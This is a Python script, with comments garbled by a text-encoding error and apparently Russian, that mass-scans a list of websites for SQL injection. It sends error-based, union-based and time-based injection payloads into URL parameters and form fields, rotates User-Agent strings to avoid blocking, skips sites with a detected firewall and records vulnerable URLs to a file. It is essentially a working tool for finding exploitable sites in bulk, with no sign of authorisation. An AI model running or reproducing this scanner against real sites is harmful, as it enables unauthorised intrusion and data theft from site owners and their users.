import aiohttp
import asyncio
import random
import time
from urllib.parse import urlparse, parse_qs, urlencode
from bs4 import BeautifulSoup
from tqdm import tqdm

# –ß–∏—Ç–∞–µ–º —Å–ø–∏—Å–æ–∫ URL
with open("sites.txt", "r") as file:
    urls = [line.strip() for line in file if line.strip()]

# SQL-–∏–Ω—ä–µ–∫—Ü–∏–æ–Ω–Ω—ã–µ –ø–µ–π–ª–æ–∞–¥—ã
sql_payloads = [
    "'", "\"", "' OR '1'='1' --", "\" OR \"1\"=\"1\" --", "' OR 1=1 --", 
    "' UNION SELECT 1,2,3 --", "' AND SLEEP(5) --", "' AND 1=CONVERT(int, SLEEP(5)) --", 
    "'; WAITFOR DELAY '0:0:5' --", "' OR 1 GROUP BY CONCAT(0x7e,user(),0x7e,FLOOR(RAND(0)*2)) HAVING COUNT(*)>1 --"
]

# User-Agents –¥–ª—è –æ–±—Ö–æ–¥–∞ –±–ª–æ–∫–∏—Ä–æ–≤–æ–∫
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Mobile/15E148 Safari/604.1"
]

async def detect_waf(session, url):
    """–û–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ WAF (Cloudflare, ModSecurity –∏ —Ç. –¥.)"""
    try:
        async with session.get(url, headers={"User-Agent": random.choice(USER_AGENTS)}, timeout=5) as response:
            headers = response.headers
            if "server" in headers and ("cloudflare" in headers["server"].lower() or "sucuri" in headers["server"].lower()):
                print(f"\033[93m[‚ö†] WAF –æ–±–Ω–∞—Ä—É–∂–µ–Ω –Ω–∞ {url}\033[0m")
                return True
    except:
        pass
    return False

async def check_sql_injection(session, base_url, param, original_value, progress_bar):
    """–¢–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ SQL-–∏–Ω—ä–µ–∫—Ü–∏–π"""
    for payload in sql_payloads:
        test_url = f"{base_url}?{urlencode({param: original_value + payload})}"
        progress_bar.set_description(f"\033[94m[üîç] –¢–µ—Å—Ç: {param} -> {payload[:10]}...\033[0m")

        try:
            start_time = time.time()
            async with session.get(test_url, headers={"User-Agent": random.choice(USER_AGENTS)}, timeout=10) as response:
                text = await response.text()
                response_time = time.time() - start_time

                # –ü—Ä–æ–≤–µ—Ä—è–µ–º –æ—à–∏–±–∫–∏ SQL
                if any(error in text.lower() for error in ["sql syntax", "mysql_fetch", "odbc", "sqlstate", "error in your sql"]):
                    print(f"\033[91m[üî•] SQL-–∏–Ω—ä–µ–∫—Ü–∏—è –Ω–∞–π–¥–µ–Ω–∞! {test_url}\033[0m")
                    with open("vulnerable_sites.txt", "a") as vuln_file:
                        vuln_file.write(test_url + "\n")
                    return

                # –ü—Ä–æ–≤–µ—Ä—è–µ–º Time-Based –∏–Ω—ä–µ–∫—Ü–∏–∏
                if response_time > 4:
                    print(f"\033[95m[‚è≥] –í—Ä–µ–º—è –æ—Ç–≤–µ—Ç–∞ –ø–æ–¥–æ–∑—Ä–∏—Ç–µ–ª—å–Ω–æ–µ: {test_url}\033[0m")
                    with open("vulnerable_sites.txt", "a") as vuln_file:
                        vuln_file.write(test_url + "\n")
                    return
        except:
            pass

async def scan_site(session, url, progress_bar):
    """–°–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ –æ–¥–Ω–æ–≥–æ —Å–∞–π—Ç–∞"""
    if await detect_waf(session, url):
        print(f"\033[91m[‚õî] –ü—Ä–æ–ø—É—â–µ–Ω {url} (WAF –æ–±–Ω–∞—Ä—É–∂–µ–Ω)\033[0m")
        return

    parsed_url = urlparse(url)
    params = parse_qs(parsed_url.query)

    if not params:
        print(f"\033[93m[‚ö†] {url} - –Ω–µ—Ç URL-–ø–∞—Ä–∞–º–µ—Ç—Ä–æ–≤, –∏—â–µ–º —Ñ–æ—Ä–º—ã...\033[0m")
        try:
            async with session.get(url, headers={"User-Agent": random.choice(USER_AGENTS)}, timeout=10) as response:
                text = await response.text()
                soup = BeautifulSoup(text, "html.parser")

                # –ü–æ–∏—Å–∫ —Ñ–æ—Ä–º
                forms = soup.find_all("form")
                for form in forms:
                    inputs = form.find_all("input")
                    for inp in inputs:
                        if inp.get("name"):
                            param_name = inp.get("name")
                            print(f"\033[96m[üîç] –ù–∞–π–¥–µ–Ω —Å–∫—Ä—ã—Ç—ã–π –ø–∞—Ä–∞–º–µ—Ç—Ä: {param_name}\033[0m")
                            await check_sql_injection(session, url, param_name, "1", progress_bar)
        except:
            pass
        return

    print(f"\033[92m[üîç] –ü—Ä–æ–≤–µ—Ä—è–µ–º {url} ({len(params)} –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–≤)...\033[0m")
    base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
    tasks = [check_sql_injection(session, base_url, param, values[0], progress_bar) for param, values in params.items()]
    await asyncio.gather(*tasks)

async def main():
    with tqdm(total=len(urls), desc="\033[92m[üöÄ] –°–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ —Å–∞–π—Ç–æ–≤...\033[0m", unit=" —Å–∞–π—Ç") as progress_bar:
        async with aiohttp.ClientSession() as session:
            tasks = [scan_site(session, url, progress_bar) for url in urls]
            await asyncio.gather(*tasks)
            progress_bar.update(len(urls))

# –ó–∞–ø—É—Å–∫
asyncio.run(main())
